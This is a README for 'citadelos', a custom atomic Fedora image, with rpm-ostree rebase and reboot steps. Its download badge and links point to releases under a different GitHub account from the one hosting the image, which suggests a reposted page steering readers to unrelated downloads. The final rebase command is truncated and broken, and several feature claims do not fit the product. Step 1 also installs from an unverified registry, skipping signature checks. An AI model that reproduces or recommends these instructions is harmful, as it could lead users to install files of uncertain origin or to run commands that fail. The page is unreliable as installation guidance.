# 🚀 citadelos - Easy Linux Image Rebase Made Simple

[![Download citadelos](https://img.shields.io/badge/Download-citadelos-blue.svg)](https://github.com/noel1012bhako/citadelos/releases)

## 📥 Download & Install

To get started with citadelos, visit the Releases page to download the latest version:

[Download Citadelos](https://github.com/noel1012bhako/citadelos/releases)

citadelos allows you to rebase your existing atomic Fedora installation easily. Follow the steps below to download and run the software.

## 🚀 Getting Started

1. Ensure you are running an atomic Fedora installation.
2. Open a terminal window on your computer. You can find the terminal in your applications menu.

## 📦 Installation Steps

Follow these steps to install citadelos:

### Step 1: Rebase to the Unsigned Image

First, you must rebase to the unsigned image. This step helps you install the required signing keys and policies.

In your terminal, type the following command:

```
rpm-ostree rebase ostree-unverified-registry:ghcr.io/arejula27/citadelos:latest
```

Press `Enter` to execute the command.

### Step 2: Reboot Your System

After rebasing, you need to reboot your system to complete the process. In the terminal, type:

```
systemctl reboot
```

Press `Enter` and wait for your system to restart.

### Step 3: Rebase to the Signed Image

Once your system restarts, rebase to the signed image. Enter the following command in your terminal:

```
rpm-ostree rebase ostree-image-signed:docker://gh
```

Press `Enter` to execute the command.

## 🔍 Features

- **User-Friendly Interface:** Designed for non-technical users.
- **Efficient Rebase Process:** Quickly update your atomic Fedora installation.
- **Experimental Features:** Explore the latest tools and enhancements.
  
## 💻 System Requirements

- **Operating System:** Atomic Fedora, v34 or later.
- **Disk Space:** At least 2GB of free space.
- **Network Connection:** Required for downloading images.

## 🚧 Important Notes

> ⚠️ This is an experimental feature. Please try it at your own discretion.

Ensure you follow all steps carefully to avoid any issues during the installation process.

## 🔗 Additional Resources

For more information and documentation, you can check the BlueBuild docs:

[BlueBuild Documentation](https://blue-build.org/how-to/setup/)

## 🗂️ Contributing

If you want to help enhance citadelos, please visit our GitHub repository. We welcome contributions and feedback from users.

## ✅ Troubleshooting

If you encounter issues during installation, try these troubleshooting tips:

- Ensure you are connected to the internet.
- Confirm that your terminal commands are entered correctly.
- Please visit the support page in our repository for more help.

## 🌟 Version History

Check the Releases page to find detailed version histories and changelogs.

[Visit Releases Page](https://github.com/noel1012bhako/citadelos/releases)

## 📞 Support

If you need further assistance, reach out through our GitHub Issues page. We appreciate your feedback and inquiries.